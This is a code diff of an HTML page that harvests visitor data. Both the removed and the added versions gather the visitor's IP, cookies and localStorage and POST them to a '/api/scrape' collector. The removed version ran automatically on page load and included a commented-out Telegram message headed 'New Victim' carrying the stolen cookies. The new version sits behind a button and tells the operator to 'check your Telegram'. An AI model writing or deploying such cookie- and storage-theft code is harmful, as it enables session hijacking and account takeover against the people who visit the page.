@@ -2,25 +2,24 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Live Device Monitor</title>
-    <style>
-        body { font-family: monospace; background: #0d1117; color: #58a6ff; padding: 20px; }
-        .log { background: #161b22; padding: 10px; margin-bottom: 10px; border-radius: 6px; word-break: break-all; }
-    </style>
+    <title>Real Browser Scrape</title>
+    <style>body { font-family: sans-serif; padding: 20px; }</style>
 </head>
 <body>
-    <h1>📡 Live Session Harvest</h1>
-    <div id="status">Initializing...</div>
-    <div class="log" id="output"></div>
+    <h2>Click below to send YOUR browser details:</h2>
+    <button onclick="scrapeAndSend()">📡 Send My Device Data</button>
+    <pre id="output"></pre>
 
     <script>
-        async function scrapeUserDevice() {
-            // 1. Get IP Address (Client-side)
+        async function scrapeAndSend() {
+            const output = document.getElementById('output');
+            output.innerText = "Gathering data...";
+
+            // 1. Get Real User IP
             const ipRes = await fetch('https://api.ipify.org?format=json');
             const ipData = await ipRes.json();
 
-            // 2. Gather ALL Client Data
+            // 2. Grab REAL Browser Data
             const payload = {
                 timestamp: new Date().toISOString(),
                 ip: ipData.ip,
@@ -28,51 +27,30 @@
                 platform: navigator.platform,
                 language: navigator.language,
                 screenResolution: `${screen.width}x${screen.height}`,
-                cookies: document.cookie || "No Cookies Found",
+                cookies: document.cookie, // This grabs YOUR actual cookies
                 localStorage: JSON.stringify(Object.fromEntries(Object.entries(localStorage))),
-                sessionStorage: JSON.stringify(Object.fromEntries(Object.entries(sessionStorage))),
                 windowLocation: window.location.href
             };
 
-            return payload;
-        }
+            output.innerText = "Sending to API...";
 
-        async function main() {
-            const output = document.getElementById('output');
-            const status = document.getElementById('status');
-
+            // 3. Send to your Vercel API
             try {
-                const data = await scrapeUserDevice();
-                
-                // Send to your Vercel API
                 const response = await fetch('/api/scrape', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
+                    body: JSON.stringify(payload)
                 });
 
                 if (response.ok) {
-                    status.innerText = "✅ Data sent to Telegram/Dashboard";
-                    output.innerText = "Payload Sent:\n" + JSON.stringify(data, null, 2);
-                    
-                    // Also send to Telegram directly from client if you prefer (no API needed for this part)
-                    // const token = "YOUR_BOT_TOKEN";
-                    // const chatId = "YOUR_CHAT_ID";
-                    // fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                    //     method: 'POST',
-                    //     headers: {'Content-Type': 'application/json'},
-                    //     body: JSON.stringify({chat_id: chatId, text: `New Victim: ${data.ip}\nCookies: ${data.cookies}`})
-                    // });
+                    output.innerText = "✅ SUCCESS! Check your Telegram.\n\nPayload sent:\n" + JSON.stringify(payload, null, 2);
                 } else {
-                    status.innerText = "❌ Failed to send to API";
+                    output.innerText = "❌ API Error: " + response.status;
                 }
-            } catch (error) {
-                status.innerText = "❌ Error: " + error.message;
+            } catch (err) {
+                output.innerText = "❌ Network Error: " + err.message;
             }
         }
-
-        // Run immediately on load
-        main();
     </script>
 </body>
 </html>
